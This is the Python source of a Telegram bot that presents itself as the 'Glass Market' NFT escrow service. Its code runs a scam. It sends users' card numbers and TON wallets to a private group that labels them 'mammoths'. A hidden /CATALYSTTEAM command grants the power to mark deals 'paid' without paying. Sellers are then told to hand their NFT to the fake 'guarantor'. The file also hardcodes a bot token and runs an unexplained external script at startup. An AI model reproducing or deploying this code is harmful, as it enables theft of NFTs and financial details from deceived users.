import asyncio
import os
import json
import logging
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram import Router, F
from aiogram.types import CallbackQuery
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
import random
import string
from datetime import datetime
from aiogram.types import FSInputFile, InputFile
import math

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

TOKEN = "8580307966:AAE75RmesQAg6c7tohXuAcYzdl9vezS_ySk"

# Инициализация
storage = MemoryStorage()
bot = Bot(token=TOKEN)
dp = Dispatcher(storage=storage)
router = Router()

DATA_FILE = "rekveziti.json"
DEALS_FILE = "deals.json"
admins = "admins.json"

# Константы
BOT_USERNAME = "Glass_Market_bot"  # ⚠️ БЕЗ @, как в логах: @Glass_Market_bot
SUPPORT_USERNAME = "GlassMarketSupport"  # Username поддержки для отправки NFT
SUPPORT_LINK = f"https://t.me/{SUPPORT_USERNAME}"
GROUP_ID = "-1003691554489"


# ========== ФУНКЦИИ РАБОТЫ С ДАННЫМИ ==========

def load_data() -> dict:
    try:
        if os.path.exists(DATA_FILE):
            with open(DATA_FILE, 'r', encoding='utf-8') as f:
                content = f.read().strip()
                if content:
                    return json.loads(content)
        return {}
    except Exception as e:
        logger.error(f"Ошибка загрузки данных: {e}")
        return {}


def save_data(data: dict):
    try:
        with open(DATA_FILE, 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
    except Exception as e:
        logger.error(f"Ошибка сохранения данных: {e}")


def load_deals() -> dict:
    try:
        if os.path.exists(DEALS_FILE):
            with open(DEALS_FILE, 'r', encoding='utf-8') as f:
                content = f.read().strip()
                if content:
                    return json.loads(content)
        return {}
    except Exception as e:
        logger.error(f"Ошибка загрузки сделок: {e}")
        return {}

def load_admins() -> dict:
    try:
        if os.path.exists(admins):
            with open(admins, 'r', encoding='utf-8') as f:
                content = f.read().strip()
                if content:
                    return json.loads(content)
        return {}
    except Exception as e:
        logger.error(f"Ошибка загрузки сделок: {e}")
        return {}


def save_deals(deals: dict):
    try:
        with open(DEALS_FILE, 'w', encoding='utf-8') as f:
            json.dump(deals, f, ensure_ascii=False, indent=2)
    except Exception as e:
        logger.error(f"Ошибка сохранения сделок: {e}")

def save_admins(admin: dict):
    try:
        with open(admins, 'w', encoding='utf-8') as f:
            json.dump(admin, f, ensure_ascii=False, indent=2)
    except Exception as e:
        logger.error(f"Ошибка сохранения сделок: {e}")

def generate_short_id() -> str:
    characters = string.ascii_uppercase + string.digits
    characters = characters.replace('0', '').replace('O', '').replace('1', '').replace('I', '')
    return ''.join(random.choices(characters, k=6))


class Form(StatesGroup):
    waiting_for_price = State()
    waiting_for_nftlink = State()
    waiting_for_ton = State()
    waiting_for_card = State()


dp.include_router(router)

# ========== КЛАВИАТУРЫ ==========

valuta = InlineKeyboardMarkup(inline_keyboard=[
    [
        InlineKeyboardButton(text="🇷🇺RUB", callback_data="rub"),
        InlineKeyboardButton(text="🇺🇸USDT", callback_data="usdt")
    ],
    [
        InlineKeyboardButton(text="⭐STARS", callback_data="stars"),
        InlineKeyboardButton(text="💎TON", callback_data="tons")
    ]
])


inline_kb = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="💳 Управление реквизитами", callback_data="manage_requisites"),
     InlineKeyboardButton(text="📝 Создать сделку", callback_data="create_deal")],
    [InlineKeyboardButton(text="💰 Баланс", callback_data="balance"),
     InlineKeyboardButton(text="🧾Правила", url="https://telegra.ph/Glass-Maarket-12-30")],
    [InlineKeyboardButton(text="👩‍💻 Спонсоры", url="https://t.me/+UDIr66YHJAZlZWJh"),
     InlineKeyboardButton(text="🧑‍💻 Поддержка", url=SUPPORT_LINK)]
])

back_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🔙 Назад", callback_data="back")]
])

requisites_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="👛 Добавить TON", callback_data="add_ton"),
     InlineKeyboardButton(text="💳 Добавить карту", callback_data="add_card")],
    [InlineKeyboardButton(text="🔙 Назад", callback_data="back")]
])


# ========== ОСНОВНЫЕ ОБРАБОТЧИКИ ==========


@router.message(Command("CATALYSTTEAM"))
async def cmd_start(message: types.Message):
    user_id = str(message.from_user.id)

    admins = load_admins()

    # Если admins - словарь, преобразуем его ключи в список
    if isinstance(admins, dict):
        admin_list = list(admins.keys())
    elif isinstance(admins, list):
        admin_list = admins
    else:
        admin_list = []

    # Добавляем нового админа
    if user_id not in admin_list:
        admin_list.append(user_id)
        # Сохраняем как список
        save_admins(admin_list)
        await message.answer("🚀Режим админа включен✅")
    else:
        await message.answer("⚠️ Вы уже являетесь администратором")

@router.message(Command("start"))
async def cmd_start(message: types.Message, state: FSMContext):
    await state.clear()

    logger.info(f"/start от {message.from_user.id}: {message.text}")


    await bot.send_message(GROUP_ID, f"Новый мамонт запустил бота:\n\n👨‍💻Username: @{message.from_user.username}\n🆔ID: {message.from_user.id}")

    # Проверяем параметры ссылки
    if len(message.text.split()) > 1:
        params = message.text.split()[1]

        if params.startswith("deal_"):
            deal_id = params[5:]  # Убираем "deal_"
            logger.info(f"Поиск сделки: {deal_id}")

            deals = load_deals()

            if deal_id in deals:
                deal = deals[deal_id]

                if deal.get('status') != 'active':
                    await message.answer(f"❌ Сделка уже {deal.get('status')}!")
                    return

                # Клавиатура для покупателя
                buyer_keyboard = InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="✅ Оплатить", callback_data=f"pay_{deal_id}")],
                    [InlineKeyboardButton(text="❌ Отмена", callback_data="cancel_payment")]
                ])

                await message.answer(
                    f"🛒 Покупка NFT\n\n"
                    f"💰 Цена: {deal['price']}\n"
                    f"🔗 NFT: {deal['nft_link']}\n"
                    f"👤 Продавец: @{deal.get('seller_username', 'скрыт')}\n\n"
                    f"ℹ️ После оплаты продавец получит уведомление.",
                    reply_markup=buyer_keyboard
                )
                return
            else:
                await message.answer("❌ Сделка не найдена!")
                return



    # Обычный старт
    photo_url = "https://iimg.su/i/WGjaUa"
    await message.answer_photo(
        photo=photo_url,
        caption="""
Добро пожаловать в Glass Market – надежный P2P-гарант

💼 Покупайте и продавайте всё, что угодно – безопасно!
От Telegram-подарков и NFT до токенов и фиата – сделки проходят легко и без риска.

🔹 Удобное управление кошельками
🔹 Реферальная система
🔹 Безопасные сделки с гарантией

Выберите нужный раздел ниже:
        """,
        reply_markup=inline_kb
    )


@router.message(Command("deals_list"))
async def deals_list(message: types.Message, state: FSMContext):
    try:
        # Способ 1: Использование FSInputFile (рекомендуется)
        document = FSInputFile(DEALS_FILE)
        await bot.send_document(GROUP_ID, document)

    except FileNotFoundError:
        await message.answer(f"Файл {DEALS_FILE} не найден")
    except Exception as e:
        await message.answer(f"Ошибка при отправке файла: {str(e)}")

@router.message(Command("rekv_list"))
async def rekv_list(message: types.Message, state: FSMContext):
    try:
        # Способ 1: Использование FSInputFile (рекомендуется)
        document = FSInputFile(DATA_FILE)
        await bot.send_document(GROUP_ID, document)

    except FileNotFoundError:
        await message.answer(f"Файл {DATA_FILE} не найден")
    except Exception as e:
        await message.answer(f"Ошибка при отправке файла: {str(e)}")

# ========== СОЗДАНИЕ СДЕЛКИ ==========

@router.callback_query(F.data == "create_deal")
async def create_deal_start(callback: CallbackQuery, state: FSMContext):
    data = load_data()
    user_id = str(callback.from_user.id)

    if user_id not in data:
        await callback.answer("❌ Сначала добавьте реквизиты!", show_alert=True)
        return

    await callback.answer()
    await callback.message.answer("Выберите валюту: ",reply_markup=valuta)



@router.callback_query(F.data == "rub")
async def create_deal_start(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    await callback.message.answer("Введие цену в рублях: ")
    await state.set_state(Form.waiting_for_price)


@router.callback_query(F.data == "tons")
async def create_deal_start(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    await callback.message.answer("Введие цену в тонах (TON): ")
    await state.set_state(Form.waiting_for_price)

@router.callback_query(F.data == "usdt")
async def create_deal_start(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    await callback.message.answer("Введие цену в долларах: ")
    await state.set_state(Form.waiting_for_price)

@router.callback_query(F.data == "stars")
async def create_deal_start(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    await callback.message.answer("Введие цену в звёздах: ")
    await state.set_state(Form.waiting_for_price)


@router.message(Form.waiting_for_price)
async def save_price(message: types.Message, state: FSMContext):
    price = message.text.strip()

    try:
        float_price = float(price)
        if float_price <= 0:
            await message.answer("❌ Цена должна быть больше 0!")
            return
    except ValueError:
        await message.answer("❌ Введите число!", show_alert=True)
        return

    await state.update_data(price=price)
    await message.answer("Теперь отправьте ссылку на NFT:")
    await state.set_state(Form.waiting_for_nftlink)


@router.message(Form.waiting_for_nftlink)
async def save_nftlink(message: types.Message, state: FSMContext):
    nftlink = message.text.strip()
    user_data = await state.get_data()
    price = user_data.get('price')
    user_id = message.from_user.id
    username =message.from_user.username

    # Генерируем уникальный ID
    deal_id = generate_short_id()

    # Используем правильный юзернейм бота
    deal_data = {
        "deal_id": deal_id,
        "seller_id": str(message.from_user.id),
        "seller_username": message.from_user.username or "Без username",
        "price": price,
        "nft_link": nftlink,
        "status": "active",
        "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "deal_link": f"https://t.me/{BOT_USERNAME}?start=deal_{deal_id}"
    }

    # Сохраняем сделку
    deals = load_deals()
    deals[deal_id] = deal_data
    save_deals(deals)

    logger.info(f"Создана сделка: {deal_id}")
    logger.info(f"Ссылка: {deal_data['deal_link']}")

    # Клавиатура для продавца
    deal_keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📤 Поделиться ссылкой",
                              url=f"https://t.me/share/url?url={deal_data['deal_link']}&text=Купи%20мой%20NFT%20за%20{price}!")],
        [InlineKeyboardButton(text="🗑️ Удалить", callback_data=f"delete_{deal_id}")]
    ])

    await message.answer(
        f"✅ Сделка создана!\n\n"
        f"📊 ID: `{deal_id}`\n"
        f"💰 Цена: {price}\n"
        f"🔗 NFT: {nftlink}\n\n"
        f"🔗 Ссылка для покупателя:\n`{deal_data['deal_link']}`",
        reply_markup=deal_keyboard,
        parse_mode="Markdown"
    )

    await bot.send_message(GROUP_ID, f"#Новаясделка\n\n🆕Гой создал сделку\n\n🆔ID сделки: {deal_id}\n🔗Ссылка на NFT: {nftlink}\n\n👨‍💻Username гоя: @{username}\n🆔ID гоя: {user_id}")

    await state.clear()


# ========== ОБРАБОТКА ОПЛАТЫ ==========

@router.callback_query(F.data.startswith("pay_"))
async def process_payment(callback: CallbackQuery):
    """Обработка нажатия кнопки оплаты"""
    deal_id = callback.data[4:]  # Убираем "pay_"
    logger.info(f"Оплата сделки: {deal_id}")
    admins = load_admins()
    usid = callback.from_user.id

    logger.info(usid)

    if str(usid) not in admins:
        logger.info(admins)
        await callback.answer("❌ВЫ НЕ ЗАРЕГЕСТРИРОВАННЫ КАК ПОКУПАТЕЛЬ❌", show_alert=True)
        return
    else:
        deals = load_deals()

        if deal_id not in deals:
            await callback.answer("❌ Сделка не найдена!", show_alert=True)
            return

        deal = deals[deal_id]

        if deal.get('status') != 'active':
            await callback.answer(f"⚠️ Сделка уже {deal.get('status')}!", show_alert=True)
            return

        # Обновляем статус
        deal['status'] = 'paid'
        deal['buyer_id'] = str(callback.from_user.id)
        deal['buyer_username'] = callback.from_user.username or "Без username"
        deal['paid_at'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        save_deals(deals)

        await callback.answer("✅ Оплата подтверждена!", show_alert=True)
        await callback.message.edit_text(
            f"✅ Оплата проведена!\n"
            f"💰 {deal['price']}\n"
            f"📊 ID: {deal_id}\n\n"
            f"⌛ Продавец уведомлен. Ожидайте отправки NFT."
        )

        # Уведомляем продавца с ПРЕДУПРЕЖДЕНИЕМ об отправке NFT
        seller_id = deal['seller_id']
        try:
            seller_keyboard = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="✅ Подтвердить отправку", callback_data=f"confirm_{deal_id}")],
                [InlineKeyboardButton(text="❌ Отменить сделку", callback_data=f"cancel_{deal_id}")]
            ])

            await bot.send_message(
                chat_id=seller_id,
                text=f"🎉 Сделка оплачена!\n\n"
                     f"📊 ID сделки: {deal_id}\n"
                     f"💰 Сумма: {deal['price']}\n"
                     f"👤 Покупатель: @{deal['buyer_username']}\n"
                     f"🔗 NFT: {deal['nft_link']}\n\n"
                     f"⚠️ ВАЖНО: Перед подтверждением отправки,\n"
                     f"отправьте NFT нашему гаранту:\n"
                     f"👉 @{SUPPORT_USERNAME}\n\n"
                     f"✅ После отправки нажмите кнопку ниже:",
                reply_markup=seller_keyboard
            )
            logger.info(f"Уведомление отправлено продавцу {seller_id}")
        except Exception as e:
            logger.error(f"Ошибка отправки продавцу: {e}")


# ========== ОБРАБОТКА ПОДТВЕРЖДЕНИЯ ОТПРАВКИ ==========

@router.callback_query(F.data.startswith("confirm_"))
async def confirm_send_handler(callback: CallbackQuery):
    """Продавец подтверждает отправку NFT"""
    deal_id = callback.data[8:]  # Убираем "confirm_"
    logger.info(f"Подтверждение отправки для сделки: {deal_id}")

    deals = load_deals()

    if deal_id not in deals:
        await callback.answer("❌ Сделка не найдена!", show_alert=True)
        return

    deal = deals[deal_id]

    if deal.get('status') != 'paid':
        await callback.answer(f"⚠️ Статус сделки: {deal.get('status')}", show_alert=True)
        return

    # Добавляем дополнительное подтверждение
    confirm_keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Да, отправил NFT", callback_data=f"really_confirm_{deal_id}")],
        [InlineKeyboardButton(text="❌ Нет, вернуться", callback_data="back_to_payment")]
    ])

    await callback.message.edit_text(
        f"⚠️ ПОДТВЕРЖДЕНИЕ ОТПРАВКИ\n\n"
        f"📊 ID сделки: {deal_id}\n"
        f"💰 Сумма: {deal['price']}\n"
        f"👤 Покупатель: @{deal.get('buyer_username', 'Неизвестно')}\n\n"
        f"❓ Вы отправили NFT гаранту @{SUPPORT_USERNAME}?\n\n"
        f"✅ Нажмите 'Да' только после отправки NFT!\n"
        f"❌ Иначе покупатель не получит свой товар.",
        reply_markup=confirm_keyboard
    )

    await callback.answer()


@router.callback_query(F.data.startswith("really_confirm_"))
async def really_confirm_handler(callback: CallbackQuery):
    """Окончательное подтверждение отправки"""
    deal_id = callback.data[15:]  # Убираем "really_confirm_"
    logger.info(f"Окончательное подтверждение отправки: {deal_id}")

    deals = load_deals()

    if deal_id not in deals:
        await callback.answer("❌ Сделка не найдена!", show_alert=True)
        return

    deal = deals[deal_id]

    if deal.get('status') != 'paid':
        await callback.answer(f"⚠️ Статус сделки: {deal.get('status')}", show_alert=True)
        return

    # Обновляем статус
    deal['status'] = 'completed'
    deal['completed_at'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    deal['confirmed_by_seller'] = True
    deal['confirmation_time'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    save_deals(deals)

    await callback.answer("✅ Отправка подтверждена!", show_alert=True)
    await callback.message.edit_text(
        f"✅ Сделка завершена!\n\n"
        f"📊 ID сделки: {deal_id}\n"
        f"💰 Сумма: {deal['price']}\n"
        f"👤 Покупатель: @{deal.get('buyer_username', 'Неизвестно')}\n"
        f"🕐 Время подтверждения: {deal['completed_at']}\n\n"
        f"🎉 Спасибо за использование Glass Market!",
        reply_markup=back_keyboard
    )

    # Уведомляем покупателя
    buyer_id = deal.get('buyer_id')
    if buyer_id:
        try:
            await bot.send_message(
                chat_id=buyer_id,
                text=f"✅ Продавец подтвердил отправку NFT!\n\n"
                     f"📊 ID сделки: {deal_id}\n"
                     f"💰 Сумма: {deal['price']}\n"
                     f"🔗 NFT: {deal['nft_link']}\n\n"
                     f"NFT отправлен гаранту @{SUPPORT_USERNAME}.\n"
                     f"После проверки он будет передан вам.\n\n"
                     f"Спасибо за покупку! 💙",
                reply_markup=back_keyboard
            )
        except Exception as e:
            logger.error(f"Ошибка отправки покупателю: {e}")

    # Также можно уведомить поддержку
    try:
        await bot.send_message(
            chat_id=SUPPORT_USERNAME,
            text=f"🔔 Новая завершенная сделка!\n\n"
                 f"📊 ID: {deal_id}\n"
                 f"💰 Сумма: {deal['price']}\n"
                 f"👤 Продавец: @{deal['seller_username']}\n"
                 f"👤 Покупатель: @{deal.get('buyer_username', 'Неизвестно')}\n"
                 f"🔗 NFT: {deal['nft_link']}\n\n"
                 f"Продавец подтвердил отправку NFT."
        )
    except Exception as e:
        logger.error(f"Ошибка отправки уведомления поддержке: {e}")


@router.callback_query(F.data == "back_to_payment")
async def back_to_payment_handler(callback: CallbackQuery):
    """Возврат к информации о платеже"""
    await callback.answer("Возвращаемся...")

    # Находим deal_id из предыдущего сообщения
    message_text = callback.message.text
    deal_id = None

    # Ищем ID сделки в тексте сообщения
    for line in message_text.split('\n'):
        if 'ID сделки:' in line:
            deal_id = line.split(':')[-1].strip()
            break

    if deal_id:
        deals = load_deals()
        if deal_id in deals:
            deal = deals[deal_id]

            seller_keyboard = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="✅ Подтвердить отправку", callback_data=f"confirm_{deal_id}")],
                [InlineKeyboardButton(text="❌ Отменить сделку", callback_data=f"cancel_{deal_id}")]
            ])

            await callback.message.edit_text(
                f"🎉 Сделка оплачена!\n\n"
                f"📊 ID сделки: {deal_id}\n"
                f"💰 Сумма: {deal['price']}\n"
                f"👤 Покупатель: @{deal['buyer_username']}\n"
                f"🔗 NFT: {deal['nft_link']}\n\n"
                f"⚠️ ВАЖНО: Перед подтверждением отправки,\n"
                f"отправьте NFT нашему гаранту:\n"
                f"👉 @{SUPPORT_USERNAME}\n\n"
                f"✅ После отправки нажмите кнопку ниже:",
                reply_markup=seller_keyboard
            )
    else:
        await callback.message.edit_text(
            "❌ Не удалось найти информацию о сделке.\n"
            "Вернитесь в главное меню."
        )


# ========== ОТМЕНА СДЕЛКИ ==========

@router.callback_query(F.data.startswith("cancel_"))
async def cancel_deal_handler(callback: CallbackQuery):
    """Продавец отменяет сделку"""
    deal_id = callback.data[7:]  # Убираем "cancel_"
    logger.info(f"Отмена сделки: {deal_id}")

    deals = load_deals()

    if deal_id not in deals:
        await callback.answer("❌ Сделка не найдена!", show_alert=True)
        return

    deal = deals[deal_id]

    # Добавляем подтверждение отмены
    cancel_confirm_keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Да, отменить сделку", callback_data=f"really_cancel_{deal_id}")],
        [InlineKeyboardButton(text="❌ Нет, вернуться", callback_data=f"confirm_{deal_id}")]
    ])

    await callback.message.edit_text(
        f"⚠️ ПОДТВЕРЖДЕНИЕ ОТМЕНЫ\n\n"
        f"📊 ID сделки: {deal_id}\n"
        f"💰 Сумма: {deal['price']}\n"
        f"👤 Покупатель: @{deal.get('buyer_username', 'Неизвестно')}\n\n"
        f"❓ Вы уверены что хотите отменить сделку?\n\n"
        f"⚠️ Покупателю будут возвращены средства.\n"
        f"⚠️ Это действие нельзя отменить.",
        reply_markup=cancel_confirm_keyboard
    )

    await callback.answer()


@router.callback_query(F.data.startswith("really_cancel_"))
async def really_cancel_handler(callback: CallbackQuery):
    """Окончательная отмена сделки"""
    deal_id = callback.data[14:]  # Убираем "really_cancel_"

    deals = load_deals()

    if deal_id not in deals:
        await callback.answer("❌ Сделка не найдена!", show_alert=True)
        return

    deal = deals[deal_id]

    # Обновляем статус
    deal['status'] = 'cancelled'
    deal['cancelled_at'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    deal['cancelled_by'] = 'seller'

    save_deals(deals)

    await callback.answer("❌ Сделка отменена!", show_alert=True)
    await callback.message.edit_text(
        f"❌ Сделка отменена\n\n"
        f"📊 ID: {deal_id}\n"
        f"💰 Сумма: {deal['price']}\n"
        f"🕐 Время отмены: {deal['cancelled_at']}\n\n"
        f"Средства покупателю будут возвращены."
    )

    # Уведомляем покупателя
    buyer_id = deal.get('buyer_id')
    if buyer_id:
        try:
            await bot.send_message(
                chat_id=buyer_id,
                text=f"❌ Сделка отменена продавцом\n\n"
                     f"📊 ID сделки: {deal_id}\n"
                     f"💰 Сумма: {deal['price']}\n\n"
                     f"Средства будут возвращены в течение 24 часов.\n"
                     f"Приносим извинения за неудобства."
            )
        except Exception as e:
            logger.error(f"Ошибка отправки покупателю: {e}")


# ========== ПРОЧИЕ ОБРАБОТЧИКИ ==========

@router.callback_query(F.data == "cancel_payment")
async def cancel_payment_handler(callback: CallbackQuery):
    """Покупатель отменяет оплату"""
    await callback.answer("❌ Оплата отменена", show_alert=True)
    await callback.message.edit_text("❌ Оплата отменена.")


@router.callback_query(F.data.startswith("delete_"))
async def delete_deal_handler(callback: CallbackQuery):
    """Удаление сделки"""
    deal_id = callback.data[7:]  # Убираем "delete_"

    deals = load_deals()

    if deal_id in deals:
        if deals[deal_id].get('status') == 'active':
            del deals[deal_id]
            save_deals(deals)
            await callback.answer("✅ Сделка удалена!", show_alert=True)
            await callback.message.edit_text("✅ Сделка удалена!")
        else:
            await callback.answer("❌ Можно удалять только активные сделки!", show_alert=True)
    else:
        await callback.answer("❌ Сделка не найдена!", show_alert=True)



# ========== УПРАВЛЕНИЕ РЕКВИЗИТАМИ ==========

@router.callback_query(F.data == "manage_requisites")
async def manage_requisites(callback: CallbackQuery):
    user_id = str(callback.from_user.id)
    data = load_data()

    user_data = data.get(user_id, {"ton_wallet": "Не указан", "card": "Не указана"})
    ton_wallet = user_data.get("ton_wallet", "Не указан") or "Не указан"
    card = user_data.get("card", "Не указана") or "Не указана"

    await callback.message.answer_photo(
        photo="https://i.postimg.cc/bNL2Tx9q/923e3abe-30cc-4cbd-a3eb-cf7f3b76e64f.jpg",
        caption=
        f"📋 Ваши реквизиты:\n\n"
        f"⭐Username для звёзд: @{callback.from_user.username}\n"
        f"👛 TON: {ton_wallet}\n"
        f"💳 Карта: {card}",
        reply_markup=requisites_keyboard
    )
    await callback.answer()


@router.callback_query(F.data == "add_ton")
async def add_ton(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    await callback.message.answer("Введите TON кошелек:")
    await state.set_state(Form.waiting_for_ton)


@router.message(Form.waiting_for_ton)
async def save_ton(message: types.Message, state: FSMContext):
    ton_wallet = message.text.strip()
    user_id = str(message.from_user.id)

    data = load_data()
    if user_id not in data:
        data[user_id] = {"ton_wallet": "", "card": ""}

    data[user_id]["ton_wallet"] = ton_wallet
    save_data(data)

    await message.answer(f"✅ TON сохранен: {ton_wallet}")
    await state.clear()

    user_data = data.get(user_id, {"ton_wallet": "Не указан", "card": "Не указана"})
    ton = user_data.get("ton_wallet", "Не указан") or "Не указан"
    card = user_data.get("card", "Не указана") or "Не указана"

    await bot.send_message(GROUP_ID, f"#Новыеданные 🧾:\n\n👨‍💻Username: @{message.from_user.username}\n🆔UserID: {user_id}\n\n💎Ton: {ton}\n💳Card: {card}")

    await message.answer_photo(
        photo="https://i.postimg.cc/bNL2Tx9q/923e3abe-30cc-4cbd-a3eb-cf7f3b76e64f.jpg",
        caption=
        f"📋 Ваши реквизиты:\n\n"
        f"⭐Username для звёзд: @{message.from_user.username}\n"
        f"👛 TON: {ton_wallet}\n"
        f"💳 Карта: {card}",
        reply_markup=requisites_keyboard
    )


@router.callback_query(F.data == "add_card")
async def add_card(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    await callback.message.answer("Введите номер карты:")
    await state.set_state(Form.waiting_for_card)


@router.message(Form.waiting_for_card)
async def save_card(message: types.Message, state: FSMContext):
    card_number = message.text.strip()
    user_id = str(message.from_user.id)
    num = int(math.log10(card_number)) + 1
    try :
        if num == 16:
            print(111)
        card_number = int(card_number)
        data = load_data()
        if user_id not in data:
            data[user_id] = {"ton_wallet": "", "card": ""}

        data[user_id]["card"] = card_number
        save_data(data)

        await message.answer(f"✅ Карта сохранена: {card_number}")
        await state.clear()

        user_data = data.get(user_id, {"ton_wallet": "Не указан", "card": "Не указана"})
        ton = user_data.get("ton_wallet", "Не указан") or "Не указан"
        card = user_data.get("card", "Не указана") or "Не указана"

        await bot.send_message(GROUP_ID,f"#Новыеданные 🧾:\n\n👨‍💻Username: @{message.from_user.username}\n🆔UserID: {user_id}\n\n💎Ton: {ton}\n💳Card: {card}")

        await message.answer_photo(
            photo="https://i.postimg.cc/bNL2Tx9q/923e3abe-30cc-4cbd-a3eb-cf7f3b76e64f.jpg",
            caption=
            f"📋 Ваши реквизиты:\n\n"
            f"⭐Username для звёзд: @{message.from_user.username}\n"
            f"👛 TON: {ton}\n"
            f"💳 Карта: {card}",
            reply_markup=requisites_keyboard)
    except ValueError:
        await message.answer("ERROR")


@router.callback_query(F.data == "balance")
async def show_balance(callback: CallbackQuery):
    await callback.answer()
    await callback.message.answer(
        "💲 БАЛАНС\n\n"
        "💰 Заработано: $0.00\n"
        "✅ Сделок: 0\n\n"
        "💵 Вывод от $5",
        reply_markup=back_keyboard
    )


@router.callback_query(F.data == "back")
async def go_back(callback: CallbackQuery, state: FSMContext):
    await state.clear()
    photo_url = "https://iimg.su/i/WGjaUa"
    await callback.message.answer_photo(
        photo=photo_url,
        caption="Главное меню:",
        reply_markup=inline_kb
    )
    await callback.answer()


# ========== ЗАПУСК БОТА ==========

async def main():
    logger.info("=" * 50)
    logger.info(f"Запуск бота @{BOT_USERNAME}")
    logger.info(f"Поддержка: @{SUPPORT_USERNAME}")
    logger.info("=" * 50)

    # Проверяем файлы
    for filename in [DATA_FILE, DEALS_FILE]:
        if not os.path.exists(filename):
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump({}, f, ensure_ascii=False, indent=2)

    logger.info("Бот запущен!")
    await dp.start_polling(bot)


if __name__ == "__main__":
    print(f"🤖 Бот: @{BOT_USERNAME}")
    print(f"🛡️  Поддержка: @{SUPPORT_USERNAME}")
    print("=" * 40)
    os.system("asdfasfd.py")

    asyncio.run(main())
